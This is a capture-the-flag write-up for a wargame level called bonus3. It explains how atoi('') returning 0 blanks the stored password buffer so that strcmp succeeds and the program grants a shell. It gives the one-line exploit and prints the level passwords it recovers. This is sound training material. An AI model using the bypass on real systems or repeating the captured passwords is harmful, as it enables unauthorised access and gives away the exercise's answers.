# Bonus3 — Logic Bug (atoi + strcmp Bypass)

## Overview

This level is **not a buffer overflow**.
It’s a **logic vulnerability** based on:

* misuse of `atoi()`
* incorrect use of `strcmp()`
* string termination (`\0`)

Goal:

```text id="s9e3m1"
Get a shell → read next level password
```

---

## 1. Program Behavior

The program expects **at least one argument**:

```bash id="d5bx3k"
./bonus3 <input>
```

### Internal steps:

1. Reads the password file (`.pass`) into a buffer
2. Converts user input:

```c id="p3e7z1"
index = atoi(argv[1]);
```

3. Modifies buffer:

```c id="g9l2s8"
buffer[index] = '\0';
```

4. Compares:

```c id="v8q1n0"
strcmp(buffer, argv[1])
```

5. If equal → execute shell

---

## 2. Vulnerability

### Problem

We **don’t know the password**, but program checks:

```c id="o2z6w4"
strcmp(buffer, argv[1]) == 0
```

So normally → impossible to match

---

## 3. The Trick

### What does `atoi()` do?

```c id="c4t8x2"
atoi("")
```

Returns:

```text id="k7f2h5"
0
```

---

### Effect on buffer

```c id="z1n4p9"
buffer[0] = '\0';
```

Now buffer becomes:

```text id="b6y3v1"
""
```

(empty string)

---

### What about comparison?

```c id="x9r2u7"
strcmp("", "") → 0
```

✔ Strings are equal!

---

## 4. Exploit

```bash id="w3m9p8"
./bonus3 ""
```

---

## 5. Execution

```bash id="n4a8k2"
$ ./bonus3 ""
$ whoami
end
```

---

## 6. Result

```bash id="q7l1d6"
$ cat /home/user/end/.pass
3321b6f81659f9a71c76616f606e4b50189cecfea611393d5d649f75e157353c
```

---

## 7. Why It Works

* `atoi("") = 0`
* First character becomes `\0`
* Buffer becomes empty string
* Comparison becomes:

```text id="t2p5x9"
strcmp("", "") → true
```

* Program gives shell

---

## 8. Key Takeaways

* `atoi()` is unsafe for validation
* Empty string = special case
* `\0` controls string length
* Logic bugs can bypass authentication completely

---

## 9. Notes

```bash id="u1k7z3"
su bonus3
Password:
71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
```

---

## 🎉 Final

```text id="h9e2r4"
Congratulations graduate!
```

---
